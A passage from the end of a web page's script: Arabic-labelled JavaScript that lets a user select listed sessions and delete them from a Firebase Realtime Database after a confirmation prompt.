      document.body.classList.add('selection-mode');
      document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
      updateSelCount();
    }

    function cancelSelection() {
      document.body.classList.remove('selection-mode');
      document.querySelectorAll('.vi-checkbox').forEach(function(cb) { cb.checked = false; });
    }

    function updateSelCount() {
      var count = document.querySelectorAll('.vi-checkbox:checked').length;
      var el = document.getElementById('selCount');
      if (el) el.textContent = count + ' محدد';
    }

    function deleteSelected() {
      var checked = document.querySelectorAll('.vi-checkbox:checked');
      if (checked.length === 0) { alert('لم تحدد أي جلسة'); return; }
      if (!confirm('هل أنت متأكد من حذف ' + checked.length + ' جلسة؟')) return;
      var promises = [];
      checked.forEach(function(cb) {
        promises.push(firebase.database().ref('site1/sessions/' + cb.dataset.id).remove());
      });
      Promise.all(promises).then(function() {
        cancelSelection();
        alert('تم الحذف بنجاح');
      });
    }

  </script>
</body>
</html>
